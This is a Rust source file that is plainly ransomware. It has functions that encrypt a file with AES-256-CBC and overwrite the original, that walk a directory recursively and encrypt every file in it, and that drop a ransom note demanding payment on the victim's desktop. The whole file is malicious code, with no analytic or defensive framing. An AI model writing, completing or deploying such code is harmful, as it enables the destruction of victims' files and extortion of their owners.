use std::fs::{self, File};
use std::io::{Read, Write};
use std::path::{Path, PathBuf};
use aes::Aes256;
use cbc::Encryptor;
use cipher::{
    block_padding::Pkcs7,
    BlockEncryptMut,
    KeyIvInit,
};
use dirs;

type Aes256CbcEnc = Encryptor<Aes256>;

/// Encrypts a file using AES-256-CBC and overwrites the original.
pub fn encrypt_file(filepath: &Path, key: &[u8; 32], iv: &[u8; 16]) {
    if let Ok(mut file) = File::open(filepath) {
        let mut buffer = Vec::new();
        if file.read_to_end(&mut buffer).is_ok() {
            // Pad the buffer to next multiple of 16
            let pos = buffer.len();
            let padded_len = (pos + 16) & !15;
            buffer.resize(padded_len, 0);

            let cipher = Aes256CbcEnc::new(key.into(), iv.into());

            match cipher.encrypt_padded_mut::<Pkcs7>(&mut buffer, pos) {
                Ok(encrypted) => {
                    if let Ok(mut out_file) = File::create(filepath) {
                        let _ = out_file.write_all(encrypted);
                    }
                }
                Err(err) => eprintln!("[!] Encryption failed for {:?}: {}", filepath, err),
            }
        }
    }
}

/// Recursively encrypts all files in a given directory.
pub fn encrypt_directory(path: &Path, key: &[u8; 32], iv: &[u8; 16]) {
    if let Ok(entries) = fs::read_dir(path) {
        for entry in entries.flatten() {
            let path = entry.path();
            if path.is_dir() {
                encrypt_directory(&path, key, iv); // recurse into subdirs
            } else {
                encrypt_file(&path, key, iv);
            }
        }
    }
}

/// Writes a ransom note to the victim's desktop
pub fn drop_ransom_note() {
    let desktop: PathBuf = dirs::desktop_dir().unwrap_or_else(|| Path::new("/tmp").to_path_buf());
    let note_path = desktop.join("README_RECOVER_FILES.txt");
    let note_content = r#"
Your files have been encrypted.

To recover them, you must pay the ransom.

Failure to do so will result in permanent loss of your data.
"#;

    if let Ok(mut file) = File::create(note_path) {
        let _ = file.write_all(note_content.as_bytes());
    }
}